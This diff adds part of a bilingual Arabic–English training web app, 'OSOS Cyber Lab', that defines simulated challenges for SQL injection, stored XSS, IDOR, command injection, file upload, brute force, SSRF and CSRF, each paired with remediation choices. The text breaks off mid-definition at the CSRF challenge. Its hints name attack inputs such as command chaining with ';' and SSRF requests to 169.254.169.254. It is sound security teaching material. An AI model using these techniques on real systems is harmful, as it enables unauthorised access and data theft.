@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>مختبر أسس السيبراني · OSOS Cyber Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e14; --panel:#111823; --panel2:#0d141d; --line:#1e2a38;
+  --txt:#e6edf3; --mut:#8b9bb0; --red:#ff4d5e; --redd:#2a0f14;
+  --grn:#3ddc84; --grnd:#0f2418; --cy:#36c5f0; --gold:#f2c14e;
+  --vio:#a371f7;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:"IBM Plex Sans Arabic",sans-serif;line-height:1.7;min-height:100vh}
+code,.mono,pre,input,textarea,.term{font-family:"JetBrains Mono",monospace}
+a{color:var(--cy)}
+.en{direction:ltr;text-align:left;display:block;font-family:"JetBrains Mono",monospace}
+.hidden{display:none!important}
+
+/* ---- top bar ---- */
+header{position:sticky;top:0;z-index:30;background:linear-gradient(180deg,#0d1420,#0a0e14);border-bottom:1px solid var(--line);padding:12px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:10px}
+.logo .mark{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,var(--red),#b3303c);display:grid;place-items:center;font-weight:700;font-size:20px;box-shadow:0 0 18px rgba(255,77,94,.4)}
+.logo b{font-size:17px;letter-spacing:.3px}
+.logo span{font-size:11px;color:var(--mut);display:block;margin-top:-2px}
+.hdr-spacer{flex:1}
+.rank{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:6px 12px}
+.rank .xp{font-size:12px;color:var(--mut)}
+.rank b{color:var(--gold)}
+.bar{height:7px;background:#1a2430;border-radius:20px;overflow:hidden;min-width:120px}
+.bar>i{display:block;height:100%;background:linear-gradient(90deg,var(--grn),var(--cy));border-radius:20px;transition:width .5s}
+
+/* ---- layout ---- */
+.wrap{display:flex;gap:0;align-items:flex-start}
+nav.side{width:300px;flex-shrink:0;border-left:1px solid var(--line);background:var(--panel2);min-height:calc(100vh - 64px);padding:16px 12px;position:sticky;top:64px;max-height:calc(100vh - 64px);overflow:auto}
+.lvl{margin-bottom:14px}
+.lvl>h4{font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:1px;padding:6px 8px;display:flex;justify-content:space-between;align-items:center}
+.lvl>h4 .en{font-size:10px}
+.chal{display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:9px;cursor:pointer;font-size:14px;transition:.15s;border:1px solid transparent}
+.chal:hover{background:#10202c}
+.chal.active{background:#0e2230;border-color:#1c4257}
+.chal .ico{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;font-size:13px;background:#162230;flex-shrink:0}
+.chal .nm{flex:1}
+.chal .nm small{display:block;font-size:10px;color:var(--mut)}
+.chal .st{font-size:13px}
+.chal.locked{opacity:.4;cursor:not-allowed}
+.diffdot{width:7px;height:7px;border-radius:50%}
+.d-easy{background:var(--grn)} .d-med{background:var(--gold)} .d-hard{background:var(--red)}
+
+main{flex:1;padding:24px 30px;max-width:980px;min-height:calc(100vh - 64px)}
+
+/* ---- home ---- */
+.hero{background:radial-gradient(1200px 300px at 80% -40%,rgba(255,77,94,.14),transparent),linear-gradient(135deg,#0f1a26,#0b1118);border:1px solid var(--line);border-radius:18px;padding:30px 32px;margin-bottom:22px;position:relative;overflow:hidden}
+.hero h1{font-size:27px;margin-bottom:6px}
+.hero .en{font-size:14px;color:var(--mut);margin-bottom:14px}
+.hero p{color:#c6d2df;max-width:640px;font-size:15px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{background:#132130;border:1px solid var(--line);border-radius:30px;padding:5px 13px;font-size:12px;color:#aebccb}
+.chip b{color:var(--grn)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px;cursor:pointer;transition:.18s}
+.card:hover{transform:translateY(-3px);border-color:#2a3f52;box-shadow:0 10px 30px rgba(0,0,0,.4)}
+.card h3{font-size:16px;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+.card .en{font-size:11px;color:var(--mut);margin-bottom:8px}
+.card p{font-size:13px;color:#aab8c7}
+.card .foot{margin-top:12px;display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--mut)}
+.secnote{background:var(--redd);border:1px solid #4a1820;border-radius:12px;padding:14px 18px;margin:20px 0;font-size:13px;color:#ffc9cf;display:flex;gap:12px;align-items:flex-start}
+.secnote .en{color:#e79aa2;font-size:11px;margin-top:3px}
+
+/* ---- challenge view ---- */
+.cv-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:18px}
+.cv-head .big{width:52px;height:52px;border-radius:13px;background:#162230;display:grid;place-items:center;font-size:24px;flex-shrink:0}
+.cv-head h2{font-size:22px}
+.cv-head .en{font-size:13px;color:var(--mut)}
+.badges{display:flex;gap:7px;margin-top:7px;flex-wrap:wrap}
+.b{font-size:11px;padding:3px 9px;border-radius:20px;background:#132130;border:1px solid var(--line);color:#aebccb}
+
+.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line);margin-bottom:20px;flex-wrap:wrap}
+.tab{padding:11px 15px;cursor:pointer;font-size:14px;color:var(--mut);border-bottom:2px solid transparent;white-space:nowrap;display:flex;align-items:center;gap:7px}
+.tab.on{color:var(--txt);border-color:var(--red)}
+.tab .done{color:var(--grn);font-size:12px}
+.tab .en{font-size:9px;opacity:.7}
+
+.pane{animation:fade .3s}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.bl{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px 20px;margin-bottom:16px}
+.bl .en{font-size:12px;color:var(--mut);margin-top:8px;border-top:1px dashed #22303f;padding-top:8px}
+.bl h4{margin-bottom:6px;color:var(--cy);font-size:15px}
+.goal{border-right:3px solid var(--gold);background:linear-gradient(90deg,rgba(242,193,78,.06),transparent)}
+
+/* simulated browser */
+.sim{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:14px 0;background:#fff;color:#1a2230}
+.sim .urlbar{background:#e9eef3;padding:8px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #d6dde4}
+.sim .dots{display:flex;gap:5px}.sim .dots i{width:11px;height:11px;border-radius:50%}
+.sim .dots i:nth-child(1){background:#ff5f57}.sim .dots i:nth-child(2){background:#febc2e}.sim .dots i:nth-child(3){background:#28c840}
+.sim .addr{flex:1;background:#fff;border:1px solid #d0d7de;border-radius:7px;padding:5px 11px;font-size:12px;color:#55606b;font-family:"JetBrains Mono",monospace;direction:ltr;text-align:left;cursor:text}
+.sim .body{padding:22px;direction:ltr;text-align:left;min-height:120px}
+.sim .sitehdr{display:flex;align-items:center;gap:10px;border-bottom:2px solid #eee;padding-bottom:12px;margin-bottom:16px}
+.sim .sitehdr .lg{width:30px;height:30px;border-radius:7px;background:#2d6cdf;display:grid;place-items:center;color:#fff;font-weight:700}
+.sim .sitehdr b{font-size:16px;color:#1a2230}
+.sim label{display:block;font-size:13px;color:#444;margin:10px 0 4px;font-weight:600}
+.sim input[type=text],.sim input[type=password]{width:100%;padding:9px 11px;border:1px solid #cbd3db;border-radius:7px;font-size:13px;direction:ltr}
+.sim button.go{background:#2d6cdf;color:#fff;border:0;border-radius:7px;padding:9px 18px;font-weight:600;cursor:pointer;margin-top:12px;font-family:inherit}
+.sim button.go:hover{background:#2159c7}
+.sim .result{margin-top:14px;padding:11px 13px;border-radius:8px;font-size:13px;font-family:"JetBrains Mono",monospace}
+.sim .ok{background:#e4f8ec;color:#137a3b;border:1px solid #a9e6c0}
+.sim .err{background:#fde8ea;color:#b4232e;border:1px solid #f3b6bc}
+.sim .flag{background:#fff7e0;color:#8a6400;border:1px solid #f0d98a}
+.sim table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
+.sim td,.sim th{border:1px solid #e2e7ec;padding:6px 9px;text-align:left}
+.sim th{background:#f3f6f9}
+.xssfire{animation:shake .4s}
+@keyframes shake{0%,100%{transform:none}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+.hintline{font-size:12px;color:var(--mut);margin-top:8px}
+.hintline code{background:#15202c;padding:2px 6px;border-radius:5px;color:var(--gold);direction:ltr;display:inline-block}
+
+/* defend */
+.fixopt{display:flex;gap:11px;align-items:flex-start;background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px 16px;margin-bottom:10px;cursor:pointer;transition:.15s}
+.fixopt:hover{border-color:#2a3f52}
+.fixopt.sel{border-color:var(--cy);background:#0d1f2b}
+.fixopt.correct{border-color:var(--grn);background:var(--grnd)}
+.fixopt.wrong{border-color:var(--red);background:var(--redd)}
+.fixopt .rb{width:18px;height:18px;border-radius:50%;border:2px solid #39506a;flex-shrink:0;margin-top:3px}
+.fixopt.sel .rb{border-color:var(--cy);background:var(--cy)}
+.fixopt code{font-size:12px;color:#c6d2df;direction:ltr;display:block;margin-top:6px;background:#0c141d;padding:8px 10px;border-radius:6px;white-space:pre-wrap}
+
+/* report */
+.rep label{display:block;font-size:13px;color:var(--mut);margin:12px 0 5px}
+.rep input,.rep textarea,.rep select{width:100%;background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:10px 12px;color:var(--txt);font-size:14px;font-family:inherit}
+.rep textarea{min-height:80px;resize:vertical}
+
+/* buttons */
+.btn{background:var(--red);color:#fff;border:0;border-radius:10px;padding:11px 20px;font-weight:600;cursor:pointer;font-family:inherit;font-size:14px;transition:.15s}
+.btn:hover{filter:brightness(1.1)}
+.btn.g{background:var(--grn);color:#062013}
+.btn.o{background:transparent;border:1px solid var(--line);color:var(--txt)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.rowbtns{display:flex;gap:10px;margin-top:18px;flex-wrap:wrap}
+
+/* help button + drawer */
+.helpbtn{position:fixed;bottom:24px;left:24px;z-index:50;background:linear-gradient(135deg,var(--gold),#e0a92e);color:#2a1e00;border:0;border-radius:40px;padding:13px 20px;font-weight:700;cursor:pointer;font-family:inherit;font-size:14px;box-shadow:0 8px 26px rgba(242,193,78,.4);display:flex;align-items:center;gap:8px;animation:pulse 2.4s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 8px 26px rgba(242,193,78,.35)}50%{box-shadow:0 8px 32px rgba(242,193,78,.6)}}
+.helpbtn.locked-pill{background:#1a2430;color:#7b8a9c;box-shadow:none;animation:none;border:1px solid var(--line);cursor:default;font-weight:600}
+.drawer{position:fixed;top:0;left:0;height:100vh;width:420px;max-width:90vw;background:var(--panel);border-left:1px solid var(--line);z-index:60;transform:translateX(-100%);transition:transform .32s cubic-bezier(.4,0,.2,1);overflow:auto;box-shadow:12px 0 40px rgba(0,0,0,.5)}
+.drawer.open{transform:none}
+.drawer .dh{padding:20px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;background:var(--panel)}
+.drawer .dh b{font-size:17px}
+.drawer .x{cursor:pointer;font-size:22px;color:var(--mut);background:none;border:0}
+.drawer .dc{padding:20px}
+.hsec{margin-bottom:20px;border-radius:12px;padding:16px;border:1px solid var(--line)}
+.hsec.p{background:var(--redd);border-color:#4a1820}
+.hsec.v{background:#1a1226;border-color:#3a2a52}
+.hsec.s{background:var(--grnd);border-color:#1c4a30}
+.hsec h5{font-size:14px;margin-bottom:8px;display:flex;align-items:center;gap:7px}
+.hsec p{font-size:13px;color:#c6d2df}
+.hsec .en{font-size:11px;color:var(--mut);margin-top:7px;border-top:1px dashed #33414f;padding-top:7px}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:55;opacity:0;pointer-events:none;transition:.3s}
+.overlay.on{opacity:1;pointer-events:auto}
+
+.toast{position:fixed;bottom:24px;right:24px;z-index:80;background:var(--grnd);border:1px solid var(--grn);color:#bdf5d4;padding:13px 18px;border-radius:12px;font-size:14px;transform:translateY(80px);opacity:0;transition:.35s;display:flex;align-items:center;gap:10px;max-width:340px}
+.toast.show{transform:none;opacity:1}
+.toast.bad{background:var(--redd);border-color:var(--red);color:#ffc9cf}
+
+.mnav{display:none}
+@media(max-width:860px){
+  nav.side{display:none}
+  main{padding:16px}
+  .drawer{width:100%}
+  .hero h1{font-size:22px}
+  .cv-head .big{width:42px;height:42px;font-size:20px}
+  .cv-head h2{font-size:18px}
+  .tab{padding:9px 10px;font-size:13px}
+  .helpbtn{bottom:16px;left:16px;padding:11px 16px;font-size:13px}
+  .mnav{display:flex;gap:7px;overflow-x:auto;padding:10px 14px;background:var(--panel2);border-bottom:1px solid var(--line);position:sticky;top:64px;z-index:20;-webkit-overflow-scrolling:touch}
+  .mnav::-webkit-scrollbar{display:none}
+  .mchip{flex:0 0 auto;display:flex;align-items:center;gap:6px;background:var(--panel);border:1px solid var(--line);border-radius:30px;padding:7px 13px;font-size:13px;white-space:nowrap;cursor:pointer}
+  .mchip.active{border-color:var(--red);background:#1a1012}
+  .mchip.locked{opacity:.45}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <div class="mark">أ</div>
+    <div><b>مختبر أسس السيبراني</b><span class="en">OSOS Cyber Lab</span></div>
+  </div>
+  <div class="hdr-spacer"></div>
+  <div class="rank">
+    <div>
+      <div class="xp">الرتبة <b id="rankName">مبتدئ</b></div>
+      <div class="bar" style="margin-top:4px"><i id="xpbar" style="width:0%"></i></div>
+    </div>
+    <div class="xp"><b id="xpnum" style="color:var(--grn)">0</b> XP</div>
+  </div>
+  <button class="btn o" style="padding:8px 14px" onclick="goHome()">🏠</button>
+</header>
+
+<div id="mnav" class="mnav"></div>
+<div class="wrap">
+  <nav class="side" id="side"></nav>
+  <main id="main"></main>
+</div>
+
+<button class="helpbtn" id="helpbtn" onclick="openHelp()" style="display:none">🆘 تورطت؟ ساعدني</button>
+<div class="overlay" id="ov" onclick="closeHelp()"></div>
+<div class="drawer" id="drawer">
+  <div class="dh"><b>🆘 تورطت؟ ساعدني — Stuck? Help me</b><button class="x" onclick="closeHelp()">×</button></div>
+  <div class="dc" id="helpBody"></div>
+</div>
+<div class="toast" id="toast"></div>
+
+<!-- ===== Firebase sync (same-origin as the portal → shares the student's login) ===== -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+import { getFirestore, doc, setDoc, getDoc, onSnapshot, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+const cfg={apiKey:"AIzaSyDUGYkRQq3-IGlA0mFFrB7ON8r5tD1J_7E",authDomain:"osostl-attendance.firebaseapp.com",projectId:"osostl-attendance",storageBucket:"osostl-attendance.firebasestorage.app",messagingSenderId:"285186323376",appId:"1:285186323376:web:83958618d20bcab673dc75"};
+let db=null,auth=null,ME=null;
+try{
+  const app=initializeApp(cfg); db=getFirestore(app); auth=getAuth(app);
+  onAuthStateChanged(auth, async u=>{
+    ME=null;
+    if(u&&u.email){
+      const lp=u.email.split('@')[0];
+      if(lp.startsWith('st-')){ const num=lp.split('-')[1]; let name=''; try{const sd=await getDoc(doc(db,'students',num)); if(sd.exists())name=sd.data().name||'';}catch(e){} ME={role:'student',num,name,email:u.email}; }
+      else if(u.email.startsWith('admin')||u.email.startsWith('acadmic')){ ME={role:'admin',email:u.email}; }
+      else if(lp.startsWith('t-')){ ME={role:'trainer',email:u.email}; }
+      else if(u.email.startsWith('audit')){ ME={role:'auditor',email:u.email}; }
+    }
+    window.dispatchEvent(new CustomEvent('labauth',{detail:ME}));
+  });
+  // live help-button toggle
+  onSnapshot(doc(db,'labCfg','help'), s=>{ window.dispatchEvent(new CustomEvent('labhelp',{detail:s.exists()?s.data().enabled!==false:true})); }, ()=>{});
+}catch(e){ console.warn('Firebase offline, using local only',e); }
+window.LabCloud={
+  ready:!!db, me(){return ME;},
+  async push(num,data){ if(!db||!num) return; try{ await setDoc(doc(db,'campLab',num),data,{merge:true}); }catch(e){} },
+  async pull(num){ if(!db||!num) return null; try{ const s=await getDoc(doc(db,'campLab',num)); return s.exists()?s.data():null; }catch(e){ return null; } },
+  async all(){ if(!db) return null; try{ const s=await getDocs(collection(db,'campLab')); return s.docs.map(d=>({num:d.id,...d.data()})); }catch(e){ return null; } },
+  async setHelp(on){ if(!db) return false; try{ await setDoc(doc(db,'labCfg','help'),{enabled:!!on},{merge:true}); return true; }catch(e){ return false; } },
+};
+</script>
+
+<script>
+/* =========================================================
+   مختبر أسس السيبراني — OSOS Cyber Lab
+   كل الأهداف محاكاة داخل المتصفح فقط — لا خوادم حقيقية.
+   All targets are simulated in-browser only. No real systems.
+   ========================================================= */
+
+const LEVELS = [
+  {id:"L0", ar:"المستوى ٠ · الأساسيات", en:"Foundations"},
+  {id:"L1", ar:"المستوى ١ · اللغة والأدوات", en:"Language & Tools"},
+  {id:"L2", ar:"المستوى ٢ · الهجوم", en:"Attack"},
+  {id:"L3", ar:"المستوى ٣ · الدفاع", en:"Defense"},
+  {id:"L4", ar:"المستوى ٤ · التقرير والاختبار", en:"Report & Exam"},
+];
+
+/* ---- challenge definitions ---- */
+const CH = [
+  /* ---------- L2: SQL Injection ---------- */
+  {
+    id:"sqli", lvl:"L2", icon:"💉", diff:"easy", xp:100,
+    ar:"تجاوز الدخول بـ SQL Injection", en:"SQL Injection — Login Bypass",
+    tags:["OWASP A03","Web"],
+    scenario_en:"The 'OSOS Bank' staff portal has a login form. Your mission: get in without valid credentials, then fix the flaw.",
+    scenario_ar:"بوابة موظّفي «بنك أسس» فيها نموذج دخول. مهمّتك: ادخل بدون بيانات صحيحة، ثم أصلح الثغرة.",
+    target:"sqli",
+    hint_en:"What happens if the username field is pasted straight into an SQL query? Try breaking out with a quote.",
+    hint_ar:"ماذا لو وُضعت خانة اسم المستخدم مباشرة داخل استعلام SQL؟ جرّب الخروج منها بعلامة اقتباس.",
+    fixes:[
+      {ar:"استعلام مُعامَل (Prepared Statement)", code:"db.query('SELECT * FROM users WHERE user=? AND pass=?',[u,p])", correct:true},
+      {ar:"إزالة علامات الاقتباس من المدخل فقط", code:"u = u.replace(\"'\",'')", correct:false},
+      {ar:"إخفاء رسالة الخطأ", code:"catch(e){ return 'خطأ' }", correct:false},
+    ],
+    help:{
+      p_en:"You logged in without a password. The app glued your input into an SQL query, so your quote changed the query's logic.",
+      p_ar:"دخلت بلا كلمة مرور. التطبيق لصق مدخلك داخل استعلام SQL، فعلامة الاقتباس غيّرت منطق الاستعلام.",
+      v_en:"SQL Injection: untrusted input is treated as part of the SQL command instead of as data.",
+      v_ar:"حقن SQL: المدخل غير الموثوق يُعامَل كجزء من أمر SQL بدل أن يكون بيانات.",
+      s_en:"Use parameterised queries (prepared statements). The query text stays fixed; values travel separately so the database never confuses data with command.",
+      s_ar:"استخدم الاستعلامات المُعامَلة. نص الاستعلام يبقى ثابتاً؛ القيم تسافر منفصلة فلا تخلط قاعدة البيانات البيانات بالأمر."
+    }
+  },
+  /* ---------- L2: XSS ---------- */
+  {
+    id:"xss", lvl:"L2", icon:"📝", diff:"easy", xp:100,
+    ar:"XSS مُخزَّن في دفتر الزوّار", en:"Stored XSS — Guestbook",
+    tags:["OWASP A03","Web"],
+    scenario_en:"The 'OSOS Community' guestbook shows every visitor's comment to everyone. Inject a script that runs in the victim's browser, then fix it.",
+    scenario_ar:"دفتر زوّار «مجتمع أسس» يعرض تعليق كل زائر للجميع. احقن سكربتاً يعمل في متصفح الضحية، ثم أصلحه.",
+    target:"xss",
+    hint_en:"The comment is rendered as HTML, not text. Try an <img> tag with an onerror handler.",
+    hint_ar:"التعليق يُعرَض كـHTML لا كنص. جرّب وسم <img> مع معالِج onerror.",
+    fixes:[
+      {ar:"ترميز المخرجات (Output Encoding)", code:"el.textContent = comment  // not innerHTML", correct:true},
+      {ar:"منع كلمة script فقط", code:"comment.replace('script','')", correct:false},
+      {ar:"تقصير التعليق إلى ٥٠ حرف", code:"comment.slice(0,50)", correct:false},
+    ],
+    help:{
+      p_en:"Your comment ran as code for everyone who viewed the page — including the admin.",
+      p_ar:"تعليقك عمل كـكود لكل من شاهد الصفحة — بما فيهم المدير.",
+      v_en:"Stored XSS: user input is written into the page as HTML without encoding, so scripts execute.",
+      v_ar:"XSS مُخزَّن: مدخل المستخدم يُكتب في الصفحة كـHTML بلا ترميز، فتعمل السكربتات.",
+      s_en:"Encode output: insert user text with textContent (not innerHTML). Add a Content-Security-Policy and HttpOnly cookies as depth.",
+      s_ar:"رمّز المخرجات: أدخل نص المستخدم عبر textContent لا innerHTML. أضف Content-Security-Policy وكوكيز HttpOnly كعمق دفاعي."
+    }
+  },
+  /* ---------- L2: IDOR ---------- */
+  {
+    id:"idor", lvl:"L2", icon:"🧾", diff:"med", xp:120,
+    ar:"IDOR في عارض الفواتير", en:"IDOR — Invoice Viewer",
+    tags:["OWASP A01","Access"],
+    scenario_en:"You are logged in as user #1052 on 'OSOS Store'. Your invoice loads from a URL ending in your id. Can you read someone else's?",
+    scenario_ar:"أنت داخل كمستخدم #1052 في «متجر أسس». فاتورتك تُحمَّل من رابط ينتهي برقمك. هل تقرأ فاتورة غيرك؟",
+    target:"idor",
+    hint_en:"The server trusts the id in the URL. Change 1052 to a nearby number.",
+    hint_ar:"الخادم يثق بالرقم في الرابط. غيّر 1052 إلى رقم قريب.",
+    fixes:[
+      {ar:"فحص الملكية قبل الإرجاع", code:"if(invoice.owner !== session.user) return 404", correct:true},
+      {ar:"إخفاء الرقم في الرابط", code:"url = btoa(id)  // base64", correct:false},
+      {ar:"جعل الأرقام عشوائية فقط", code:"id = random()", correct:false},
+    ],
+    help:{
+      p_en:"You read another customer's private invoice just by changing a number. The server never checked ownership.",
+      p_ar:"قرأت فاتورة عميل آخر الخاصة بمجرّد تغيير رقم. الخادم لم يتحقّق من الملكية.",
+      v_en:"IDOR / Broken Access Control: the app trusts an object id from the client without verifying the user owns it.",
+      v_ar:"IDOR / تحكّم وصول معطوب: التطبيق يثق برقم كائن من العميل دون التحقّق أن المستخدم يملكه.",
+      s_en:"On every request, verify the record's owner equals the logged-in user; otherwise return 404. Apply to every id-based route.",
+      s_ar:"في كل طلب، تحقّق أن مالك السجل يساوي المستخدم الداخل؛ وإلا أعد 404. طبّقه على كل مسار يعتمد رقماً."
+    }
+  },
+  /* ---------- L2: Command Injection ---------- */
+  {
+    id:"cmdi", lvl:"L2", icon:"🖥️", diff:"hard", xp:150,
+    ar:"حقن أوامر في أداة Ping", en:"Command Injection — Ping Tool",
+    tags:["OWASP A03","Server"],
+    scenario_en:"The 'OSOS NetTools' page pings a host you enter. Make the server run your own command, then close the door.",
+    scenario_ar:"صفحة «أدوات شبكة أسس» تعمل ping لمضيف تُدخله. اجعل الخادم يشغّل أمرك أنت، ثم أغلق الباب.",
+    target:"cmdi",
+    hint_en:"Your input reaches the shell. Try chaining a command after the host with a separator like ; or &&.",
+    hint_ar:"مدخلك يصل للصدفة. جرّب إلحاق أمر بعد المضيف بفاصل مثل ; أو &&.",
+    fixes:[
+      {ar:"استدعاء البرنامج مباشرة بوسائط منفصلة", code:"execFile('ping',['-c','1',host])", correct:true},
+      {ar:"حظر كلمة whoami فقط", code:"host.replace('whoami','')", correct:false},
+      {ar:"تشغيل الأمر كمستخدم آخر", code:"sudo -u nobody ...", correct:false},
+    ],
+    help:{
+      p_en:"Your extra command executed on the server. That is full remote command execution — the most dangerous outcome.",
+      p_ar:"أمرك الإضافي نُفِّذ على الخادم. هذا تنفيذ أوامر عن بُعد كامل — أخطر نتيجة.",
+      v_en:"Command Injection: user input is concatenated into a shell command, so a separator starts a new command.",
+      v_ar:"حقن الأوامر: مدخل المستخدم يُدمج في أمر صدفة، ففاصل يبدأ أمراً جديداً.",
+      s_en:"Never build a shell string from input. Call the program directly with arguments passed separately, and validate the host format.",
+      s_ar:"لا تبنِ نص صدفة من المدخل أبداً. استدعِ البرنامج مباشرة بوسائط منفصلة، وتحقّق من صيغة المضيف."
+    }
+  },
+  /* ---------- L3: File Upload ---------- */
+  {
+    id:"upload", lvl:"L3", icon:"📎", diff:"hard", xp:150,
+    ar:"رفع ملفات غير مقيّد", en:"Unrestricted File Upload",
+    tags:["OWASP A04","Server"],
+    scenario_en:"'OSOS Profile' lets you upload an avatar. Upload something that is not an image and gets executed — then lock it down.",
+    scenario_ar:"«ملف أسس الشخصي» يتيح رفع صورة. ارفع شيئاً ليس صورة ويُنفَّذ — ثم أغلقه.",
+    target:"upload",
+    hint_en:"The server trusts the file extension. Try a filename ending in .php instead of .jpg.",
+    hint_ar:"الخادم يثق بامتداد الملف. جرّب اسماً ينتهي بـ.php بدل .jpg.",
+    fixes:[
+      {ar:"التحقّق من المحتوى + تخزين خارج جذر الويب", code:"checkMagicBytes(f); store('/data/',randName)", correct:true},
+      {ar:"منع كلمة php في الاسم", code:"name.replace('php','')", correct:false},
+      {ar:"تصغير حجم الملف المسموح", code:"maxSize = 1MB", correct:false},
+    ],
+    help:{
+      p_en:"You uploaded server-side code and ran it by visiting its URL — the server is compromised.",
+      p_ar:"رفعت كوداً يعمل على الخادم وشغّلته بزيارة رابطه — الخادم مُخترَق.",
+      v_en:"Unrestricted upload: the app accepts and stores an executable file in a web-reachable place.",
+      v_ar:"رفع غير مقيّد: التطبيق يقبل ويخزّن ملفاً قابلاً للتنفيذ في مكان يصله الويب.",
+      s_en:"Validate by real content (magic bytes), store outside the web root, rename randomly, and serve only as downloads.",
+      s_ar:"تحقّق بالمحتوى الفعلي، خزّن خارج جذر الويب، أعد التسمية عشوائياً، وقدّمه تنزيلاً فقط."
+    }
+  },
+  /* ---------- L3: Broken Auth ---------- */
+  {
+    id:"auth", lvl:"L3", icon:"🔑", diff:"med", xp:120,
+    ar:"مصادقة ضعيفة — تخمين كلمة المرور", en:"Broken Auth — Weak Password",
+    tags:["OWASP A07","Auth"],
+    scenario_en:"'OSOS Admin' has no limit on login attempts and a weak admin password. Brute-force in, then add protection.",
+    scenario_ar:"«إدارة أسس» بلا حدّ لمحاولات الدخول وكلمة مرور مدير ضعيفة. خمّنها، ثم أضف الحماية.",
+    target:"auth",
+    hint_en:"Try the most common passwords: admin, 123456, password...",
+    hint_ar:"جرّب أشهر كلمات المرور: admin، 123456، password...",
+    fixes:[
+      {ar:"حدّ المحاولات + كلمات مرور قوية + 2FA", code:"rateLimit(5); requireStrong(); enable2FA()", correct:true},
+      {ar:"إخفاء اسم المستخدم admin", code:"adminUser = 'root'", correct:false},
+      {ar:"تأخير ثانية واحدة بين المحاولات", code:"sleep(1000)", correct:false},
+    ],
+    help:{
+      p_en:"You guessed the admin password because it was weak and attempts were unlimited.",
+      p_ar:"خمّنت كلمة مرور المدير لأنها ضعيفة والمحاولات غير محدودة.",
+      v_en:"Broken Authentication: weak passwords plus no rate limiting let an attacker try endlessly.",
+      v_ar:"مصادقة معطوبة: كلمات مرور ضعيفة بلا حدّ للمحاولات تتيح للمهاجم التجربة بلا نهاية.",
+      s_en:"Enforce strong passwords, lock out after a few failures, and require a second factor (2FA).",
+      s_ar:"افرض كلمات مرور قوية، أوقف الحساب بعد محاولات قليلة، واطلب عاملاً ثانياً (2FA)."
+    }
+  },
+  /* ---------- L3: SSRF ---------- */
+  {
+    id:"ssrf", lvl:"L3", icon:"🛰️", diff:"hard", xp:150,
+    ar:"SSRF في معاينة الروابط", en:"SSRF — Link Preview",
+    tags:["OWASP A10","Server"],
+    scenario_en:"'OSOS Reader' fetches any URL you give it to show a preview. Make the server fetch an internal address it should never reach — then restrict it.",
+    scenario_ar:"«قارئ أسس» يجلب أي رابط تُعطيه ليعرض معاينة. اجعل الخادم يجلب عنواناً داخلياً لا يجب أن يصله — ثم قيّده.",
+    target:"ssrf",
+    hint_en:"The server fetches the URL for you. Point it at an internal address like http://169.254.169.254/ or http://localhost/admin.",
+    hint_ar:"الخادم يجلب الرابط نيابةً عنك. وجّهه لعنوان داخلي مثل http://169.254.169.254/ أو http://localhost/admin.",
+    fixes:[
+      {ar:"قائمة سماح + حظر العناوين الداخلية", code:"if(!allowlist(host)||isPrivate(ip)) reject()", correct:true},
+      {ar:"حظر كلمة localhost فقط", code:"url.replace('localhost','')", correct:false},
+      {ar:"إضافة مهلة للطلب", code:"fetch(url,{timeout:3000})", correct:false},
+    ],
+    help:{
+      p_en:"You made the server fetch an internal-only service and read its response — a door into the private network.",
+      p_ar:"جعلت الخادم يجلب خدمة داخلية فقط ويقرأ ردّها — باب إلى الشبكة الخاصة.",
+      v_en:"SSRF: the server fetches a URL you control, so you can reach systems hidden behind the firewall.",
+      v_ar:"SSRF: الخادم يجلب رابطاً تتحكّم به، فتصل أنظمة مخفيّة خلف الجدار الناري.",
+      s_en:"Restrict fetches to an explicit allowlist of hosts, block private/internal IP ranges, and disable redirects that bounce inward.",
+      s_ar:"قيّد الجلب بقائمة سماح صريحة للمضيفين، احظر نطاقات العناوين الداخلية، وعطّل التحويلات التي ترتدّ للداخل."
+    }
+  },
+  /* ---------- L3: CSRF ---------- */
+  {
+    id:"csrf", lvl:"L3", icon:"🎭", diff:"med", xp:120,
+    ar:"CSRF — تغيير البريد بالخداع", en:"CSRF — Forged Email Change",
+    tags:["OWASP A01","Web"],
+    scenario_en:"'OSOS Account' changes your email with a form that carries no anti-CSRF token. Craft a malicious page that changes a victim's email silently — then add protection.",
